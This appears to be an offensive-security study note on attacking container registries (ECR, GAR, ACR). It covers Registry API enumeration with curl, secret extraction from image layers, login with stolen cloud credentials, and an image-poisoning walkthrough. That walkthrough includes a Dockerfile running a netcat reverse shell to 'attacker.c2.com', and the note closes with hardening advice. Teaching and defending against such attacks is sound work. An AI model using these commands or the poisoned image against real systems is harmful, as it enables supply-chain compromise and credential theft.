---
tags: [cloud-security, container-registry, docker, ecr, acr, gcr, supply-chain]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.29 Container Registry Attacks"
---

# Container Registry Attacks & Supply Chain Exploitation

## 1. Executive Summary & Introduction
Container registries are the beating heart of modern cloud-native deployment ecosystems. They act as centralized repositories for storing, managing, scanning, and distributing container images (such as Docker or OCI-compliant images). In a typical microservices architecture, registries serve as the critical bridge connecting Continuous Integration / Continuous Deployment (CI/CD) pipelines with runtime orchestration environments like Kubernetes, Amazon ECS, or Docker Swarm.

Major cloud providers offer heavily integrated, fully managed container registries:
- **AWS**: Amazon Elastic Container Registry (ECR)
- **GCP**: Google Artifact Registry (GAR) / Google Container Registry (GCR)
- **Azure**: Azure Container Registry (ACR)
- **Self-Hosted / Third-Party**: Docker Hub, Harbor, JFrog Artifactory, GitLab Container Registry.

Because container images encapsulate the entirety of an application—its source code, system libraries, configuration files, and unfortunately, frequently embedded secrets—compromising a container registry represents a catastrophic pivot point for attackers. It offers a direct, highly privileged vector into the software supply chain, allowing for mass-scale code execution and data exfiltration.

## 2. Architectural Deep Dive & Data Flow
A standard container registry interaction involves a client (e.g., a developer's workstation, a CI runner, or a Kubernetes Kubelet) authenticating with the registry and pulling or pushing images. The Docker Registry HTTP API V2 is the universally adopted standard protocol for these interactions.

### ASCII Diagram: Container Registry Attack Surface & Data Flow

```text
  [ External Attacker ]
       |
       | (3) Registry API Enumeration, Unauthenticated Pulls, & Secret Extraction
       v
+-------------------------------------------------------------+
|                     Container Registry                      |
|                  (e.g., AWS ECR, Azure ACR)                 |
|                                                             |
|  +----------------+  +----------------+  +---------------+  |
|  | Repositories   |  | Image Manifest |  | Image Layers  |  |
|  | (nginx, api)   |  | (JSON config)  |  | (tar.gz blobs)|  |
|  +----------------+  +----------------+  +---------------+  |
+-------------------------------------------------------------+
       | ^                                            ^ |
       | | (4) Malicious Push (Poisoning)             | | (2) Automated CI/CD Push
       | |     overwriting 'latest' tag               | |     of compiled artifacts
       v |                                            v |
+-----------------------+                        +-------------------+
|  Target Environment   |                        |  CI/CD Pipeline   |
|  (Kubernetes, ECS)    |                        |  (Jenkins, GHA)   |
+-----------------------+                        +-------------------+
       | (5) Automated Pull of                        ^
       |     Poisoned Image -> RCE                    | (1) Source Code
       v                                              |
+-----------------------+                        +-------------------+
|  Compromised Pod /    |                        |  Source Control   |
|  Worker Node          |                        |  (GitHub, GitLab) |
+-----------------------+                        +-------------------+
```

### Key Architectural Components:
1. **Manifest (`manifest.json`)**: A JSON document detailing the composition of an image. It contains references to the configuration object and the array of layers (blobs) that make up the image filesystem.
2. **Layers (Blobs)**: Compressed tarballs (`.tar.gz`) representing filesystem deltas. Images are constructed by stacking these layers union-filesystem style.
3. **Tags**: Human-readable labels (e.g., `latest`, `v1.2.3`) pointing to a specific manifest digest.

## 3. Threat Landscape & Primary Attack Vectors

Container registry attacks generally manifest through several primary vectors, ranging from simple misconfigurations to complex supply chain poisoning.

### A. Misconfigured Access Controls & Anonymous Access
If a registry is misconfigured to allow unauthenticated access (anonymous pulls), attackers can arbitrarily download proprietary corporate images. This leads to:
- Source code theft and reverse engineering.
- Discovery of zero-day vulnerabilities in custom applications.
- Extraction of hardcoded secrets, API keys, and database credentials.
In catastrophic scenarios, anonymous *pushes* are enabled, allowing attackers to unilaterally overwrite critical production images.

### B. Credential Leakage & Lateral Movement
Developers frequently embed registry credentials in insecure locations:
- `~/.docker/config.json` on local workstations.
- Environment variables or `.env` files.
- Hardcoded within CI/CD configuration files.
If an attacker gains initial access to a developer's machine or a CI runner, they can extract these authentication tokens to interact with the registry. In cloud environments, registry access is governed by IAM; a compromised EC2 instance profile might possess permissions like `ecr:GetAuthorizationToken` and `ecr:BatchGetImage`.

### C. Image Poisoning (Supply Chain Attacks)
If an attacker gains write (push) access to a registry, they can push a maliciously modified version of an existing image and tag it as `latest` or overwrite a specific version tag. When the production orchestration environment next pulls the image (e.g., during a pod restart, horizontal scaling, or a new deployment cycle), the malicious image is executed, resulting in immediate, highly privileged code execution within the cluster.

### D. Exploiting Registry Software Vulnerabilities
Self-hosted registries (like Harbor, Nexus, or GitLab) may contain intrinsic vulnerabilities. Historically, CVEs allowing Remote Code Execution (RCE) or authentication bypass have been discovered in these platforms.

### E. Quota Exhaustion / Denial of Service (DoS)
An attacker with basic push access might continuously push massive, garbage-filled layers to the registry. This rapidly exhausts storage quotas, halting the CI/CD pipeline entirely and causing an effective Denial of Service against the engineering organization.

## 4. Reconnaissance: Exploiting the Registry API V2

The Docker Registry API V2 is a RESTful interface. Attackers can interact with it directly using standard tools like `curl` if they possess credentials or if the registry lacks authentication.

### Step 1: Enumerating Repositories
The initial objective is to list all repositories hosted within the registry.
```bash
# Basic enumeration of repositories (checking for anonymous access)
curl -s -k -X GET https://registry.target.com/v2/_catalog

# Expected Output:
# {"repositories":["frontend-web", "payment-processing", "internal-admin-tool"]}
```

### Step 2: Listing Available Tags
Once high-value repositories are identified, the attacker lists available tags to find `latest` or specific developmental builds.
```bash
curl -s -k -X GET https://registry.target.com/v2/payment-processing/tags/list

# Expected Output:
# {"name":"payment-processing","tags":["latest","v1.0.4","dev-debug"]}
```

### Step 3: Fetching the Image Manifest
The manifest provides the cryptographic digest (hash) of the image and explicitly lists its constituent layers.
```bash
curl -s -k -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
  -X GET https://registry.target.com/v2/payment-processing/manifests/latest
```

### Step 4: Pulling Layers (Without a Docker Daemon)
In heavily restricted environments where the Docker daemon is unavailable, attackers can directly download the underlying layers (blobs) via the API for offline analysis.
```bash
# Download a specific layer using its sha256 digest
curl -s -k -L -O -X GET https://registry.target.com/v2/payment-processing/blobs/sha256:<digest>
```
Once the `.tar.gz` layer is downloaded, it is extracted and aggressively searched for secrets.

## 5. Exploitation: Secret Extraction & Reverse Engineering

When an image is successfully pulled (either via the API or via `docker pull registry.com/app:latest`), attackers utilize specialized tooling to dissect it.

### Technique 1: Native Docker Export
```bash
docker save registry.com/payment-processing:latest -o payment_app.tar
tar -xf payment_app.tar
```
This command extracts all layers as separate, physical tarballs on the filesystem. Attackers then script `grep`, `trufflehog`, or `trufflehog3` across these extracted layers to hunt for `.env` files, AWS Access Keys, SSH private keys, and TLS certificates.

### Technique 2: Layer Analysis with `dive`
`dive` is a highly effective tool for exploring an image layer-by-layer. Attackers use it to observe exactly what files were added, modified, or removed in each specific `Dockerfile` instruction.
**Crucial Concept:** A secret added in `Layer 1` and subsequently deleted (`rm -f config.json`) in `Layer 2` is **still fully recoverable** from `Layer 1`. The union filesystem merely masks the file in the final view; the underlying blob remains intact in the registry.

## 6. Cloud Managed Registries: AWS ECR & GCP GAR

In modern cloud environments, registry access is intrinsically tied to Cloud Identity and Access Management (IAM).

### Exploiting Amazon ECR
To interact with ECR, an attacker needs valid AWS credentials. They must first authenticate the local Docker client against the ECR registry endpoint:
```bash
# Authenticate using compromised AWS credentials
aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin <account_id>.dkr.ecr.us-east-1.amazonaws.com
```
If an attacker compromises an EC2 instance, they will interrogate the attached IAM role to determine if it permits ECR access. A highly permissive policy looks like this:
```json
{
    "Effect": "Allow",
    "Action": [
        "ecr:GetAuthorizationToken",
        "ecr:BatchCheckLayerAvailability",
        "ecr:BatchGetImage",
        "ecr:GetDownloadUrlForLayer"
    ],
    "Resource": "*"
}
```

### Exploiting Google Artifact Registry (GAR)
GCP utilizes Service Accounts. If an attacker recovers a GCP Service Account JSON key (`sa-key.json`):
```bash
cat sa-key.json | docker login -u _json_key --password-stdin https://gcr.io
```

## 7. The Image Poisoning Walkthrough

Assume an attacker has successfully obtained push access (e.g., by compromising a CI/CD runner's credentials or discovering an overly permissive IAM token).
1. **Pull the Legitimate Image:**
   `docker pull target.ecr.aws/production/nginx-frontend:latest`
2. **Modify the Entrypoint / Inject Payload:**
   The attacker creates a new `Dockerfile` that uses the legitimate image as its base.
   ```dockerfile
   FROM target.ecr.aws/production/nginx-frontend:latest
   
   # Inject malicious dependencies and C2 callback
   RUN apt-get update && apt-get install -y netcat-traditional curl
   
   # Modify the command to execute a reverse shell BEFORE starting the main app
   CMD ["/bin/sh", "-c", "nc -e /bin/sh attacker.c2.com 4444 & nginx -g 'daemon off;'"]
   ```
3. **Build the Malicious Image:**
   `docker build -t target.ecr.aws/production/nginx-frontend:latest .`
4. **Push the Poisoned Image:**
   `docker push target.ecr.aws/production/nginx-frontend:latest`
5. **Execution:** The attacker simply waits. When Kubernetes scales up a new pod or a deployment is restarted, the kubelet will pull the newly poisoned `latest` image. The reverse shell will execute, granting the attacker a foothold inside the cluster.

## 8. Defenses, Hardening, and Remediation

- **Strict Authentication & Authorization:** Enforce rigorous RBAC/IAM policies. Ensure CI/CD runners possess the absolute minimum permissions required (e.g., restricting `ecr:PutImage` access strictly to specific, designated repositories).
- **Vulnerability Scanning Integration:** Integrate automated image scanning (e.g., Trivy, Clair, AWS ECR Enhanced Scanning) directly into the registry and the CI/CD pipeline. Configure the pipeline to definitively fail if critical CVEs are detected.
- **Image Signing & Verification:** Implement Content Trust mechanisms (Docker Notary, Sigstore/Cosign). Kubernetes admission controllers (such as Kyverno or OPA Gatekeeper) must be configured to cryptographically verify image signatures before allowing them to be scheduled, mathematically guaranteeing images have not been tampered with.
- **Network Controls & Private Endpoints:** Utilize Private Endpoints (e.g., AWS VPC Endpoints / PrivateLink) to mandate that the registry can *only* be accessed from within the corporate network or specific VPCs, completely neutralizing external API enumeration attacks.
- **Immutable Image Tags:** Configure the registry to explicitly prevent tag overwriting. This thwarts an attacker's ability to silently replace a trusted tag like `latest` or `v1.0` with a poisoned image. Developers must push to new, unique tags.

## 9. Chaining Opportunities
- Compromising a container registry is frequently chained with [[33 - CI CD Pipeline Attacks]] to obtain the initial, highly privileged push credentials.
- Once a registry image is poisoned, it leads directly to execution within [[31 - Kubernetes on Cloud — EKS, GKE, AKS]], where the attacker can further escalate privileges by abusing IMDS or attached IAM roles on the compute nodes.
- Discovered secrets within layers often lead to [[34 - Cloud Backdoor via IAM Role]].

## 10. Related Notes
- [[02 - Docker Container Escapes]]
- [[34 - Cloud Backdoor via IAM Role]]
- [[33 - CI CD Pipeline Attacks]]
- [[31 - Kubernetes on Cloud — EKS, GKE, AKS]]
